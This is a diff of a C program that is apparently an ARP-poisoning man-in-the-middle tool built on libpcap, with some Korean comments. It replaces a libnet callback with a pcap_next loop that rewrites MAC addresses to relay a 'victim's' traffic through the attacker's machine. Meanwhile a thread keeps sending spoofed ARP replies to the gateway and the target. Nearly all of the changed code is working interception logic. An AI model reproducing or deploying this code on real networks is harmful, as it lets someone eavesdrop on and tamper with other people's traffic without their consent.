@@ -14,18 +14,6 @@
 #include <netinet/udp.h>
 #include <netinet/ip_icmp.h>
 #include <pcap.h>
-#include <libnet.h>
-
-typedef struct arg_cb_send_packet{
-  unsigned char* interface;
-  unsigned char gateway_mac[6];
-  unsigned char gateway_ip[16];
-  unsigned char target_mac[6];
-  unsigned char target_ip[16];
-  unsigned char local_mac[6];
-  unsigned char local_ip[16];
-  pcap_t* handle;
-} ArgSendPacket;
 
 typedef struct arg_t_receive_packet{
   char* interface;
@@ -398,41 +386,7 @@ int get_localhost_ip(char* buffer, char* interface){
   return 0;
 }
 
-
-void cb_send_packet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet){
-  struct ether_header* ethhdr;
-  struct ip* iph;
-  struct tcphdr* tcph;
-  struct udphdr* udph;
-  u_char* send_packet;
-  libnet_t *l;
-  struct libnet_link_int* network;
-  char errbuf[LIBNET_ERRBUF_SIZE];
-
-  ethhdr = (struct ether_header *)packet;
-  iph = (struct ip *)(packet + sizeof(struct ether_header));
-  //printf("CALLBACK !\n");
-  if(ntohs(ethhdr->ether_type) == ETHERTYPE_IP && (!(strcmp(inet_ntoa(iph->ip_dst), ((ArgSendPacket*)arg)->target_ip)) || !(strcmp(inet_ntoa(iph->ip_src), ((ArgSendPacket*)arg)->target_ip)))){
-    
-    if(!memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->target_mac, 6)) {
-      //printf("from sender to gateway\n");
-	memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, 6);
-	memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->gateway_mac, 6);
-    }
-    else if(!memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->gateway_mac, 6)) {
-      //printf("from gateway to sender\n");
-      memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, 6);
-      memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->target_mac, 6);
-    }
-    //printf("handle : %d\n", ((ArgSendPacket*)arg)->handle);
-    pcap_sendpacket(((ArgSendPacket*)arg)->handle, packet, pkthdr->len);
-  }
-  
-  return 0;
-}
-
-
-void t_receive_packet(void* data){
+void t_relay_packet(void* data){
   pcap_t* handle;
   char errbuf[PCAP_ERRBUF_SIZE];
   bpf_u_int32 net;
@@ -440,7 +394,10 @@ void t_receive_packet(void* data){
   struct bpf_program fp;
   struct pcap_pkthdr header;
   const u_char* packet;
-  ArgSendPacket arg;
+  struct ether_header* ethhdr;
+  struct ip* iph;
+  //struct tcphdr* tcph;
+  //struct udphdr* udph;
 
   handle = pcap_open_live(((ArgRevPacket*)data)->interface, BUFSIZ, 1, 1000, errbuf);
   if(handle == NULL){
@@ -459,16 +416,26 @@ void t_receive_packet(void* data){
     return NULL;
   }
   
-  arg.interface = ((ArgRevPacket*)data)->interface;
-  arg.handle = handle;
-  memcpy(arg.gateway_mac, ((ArgRevPacket*)data)->gateway_mac, sizeof(arg.gateway_mac));
-  memcpy(arg.gateway_ip, ((ArgRevPacket*)data)->gateway_ip, sizeof(arg.gateway_ip));
-  memcpy(arg.target_mac, ((ArgRevPacket*)data)->target_mac, sizeof(arg.target_mac));
-  memcpy(arg.target_ip, ((ArgRevPacket*)data)->target_ip, sizeof(arg.target_ip));
-  memcpy(arg.local_mac, ((ArgRevPacket*)data)->local_mac, sizeof(arg.local_mac));
-  memcpy(arg.local_ip, ((ArgRevPacket*)data)->local_ip, sizeof(arg.local_ip));
+  while(1){ 
+    packet = pcap_next(handle, &header);
+    if(!packet) continue;
+
+    ethhdr = (struct ether_header *)packet;
+    iph = (struct ip *)(packet + sizeof(struct ether_header));
+    if((ntohs(ethhdr->ether_type) == ETHERTYPE_IP) && // IP 패킷 이고
+       (!(strcmp(inet_ntoa(iph->ip_dst), ((ArgRevPacket*)data)->target_ip)) || !(strcmp(inet_ntoa(iph->ip_src), ((ArgRevPacket*)data)->target_ip)))){ // victim 과 관련 있는 IP 패킷 일 경우
+      if(!memcmp(ethhdr->ether_shost, ((ArgRevPacket*)data)->target_mac, 6)){    // OutBound 패킷 이었을 경우
+	memcpy(ethhdr->ether_shost, ((ArgRevPacket*)data)->local_mac, 6);
+	memcpy(ethhdr->ether_dhost, ((ArgRevPacket*)data)->gateway_mac, 6);
+      }
+      else if(!memcmp(ethhdr->ether_shost, ((ArgRevPacket*)data)->gateway_mac, 6)){    // InBound 패킷 이었을 경우
+	memcpy(ethhdr->ether_shost, ((ArgRevPacket*)data)->local_mac, 6);
+	memcpy(ethhdr->ether_dhost, ((ArgRevPacket*)data)->target_mac, 6);
+      }
+      pcap_sendpacket(handle, packet, header.len);
+    }
+  }
   
-  pcap_loop(handle, 0, cb_send_packet, &arg);
   pcap_close(handle);
   return 0;
 }
@@ -567,9 +534,9 @@ int main(int argc, char** argv){
 
   // do spoof !! until end of world !!
   printf("\n");
-  printf("[*] Sending poisoning payload to gateway and target...\n");
-  printf("[*] if you want to stop, press Ctrl+C.\n");
+  printf("[*] ARP poisoning to gateway and target...\n");
 
+  // arp reply 1초 주기 발송용 스레드 인자 초기화
   arg_t_arp_reply.interface = dev;
   arg_t_arp_reply.gateway_ip = gateway_ip;
   arg_t_arp_reply.gateway_mac = gateway_mac;
@@ -578,10 +545,8 @@ int main(int argc, char** argv){
   arg_t_arp_reply.local_mac = local_mac;
   if(0 > pthread_create(&p_thread[0], NULL, t_send_arp_reply_mitm, (void*)&arg_t_arp_reply))
     perror("[-] Send ARP MITM Reply Failed !\n");
-  //send_arp_reply_mitm(dev, gateway_ip, gateway_mac, argv[1], target_mac, local_mac);
 
-  // pthread_join(p_thread[0], NULL);
-  
+  // packet relay 용 스레드 인자 초기화
   arg_t_rev_packet.interface = dev;
   arg_t_rev_packet.gateway_ip = gateway_ip;
   arg_t_rev_packet.gateway_mac = gateway_mac;
@@ -589,9 +554,11 @@ int main(int argc, char** argv){
   arg_t_rev_packet.target_mac = target_mac;
   arg_t_rev_packet.local_mac = local_mac;
   arg_t_rev_packet.local_ip = local_ip;
-  if(0 > pthread_create(&p_thread[1], NULL, t_receive_packet, (void*)&arg_t_rev_packet))
-    perror("[DEBUG] Packet Relaying thread_create Failed !\n");
-  printf("[*] Packet Relaying...\n");
+  if(0 > pthread_create(&p_thread[1], NULL, t_relay_packet, (void*)&arg_t_rev_packet))
+    perror("[-] Packet Relaying thread_create Failed !\n");
+  printf("[*] Packet relaying...\n");
+  
+  printf("[*] if you want to stop, press Ctrl+C.\n");
   pthread_join(p_thread[1], NULL);
   
   return 0;
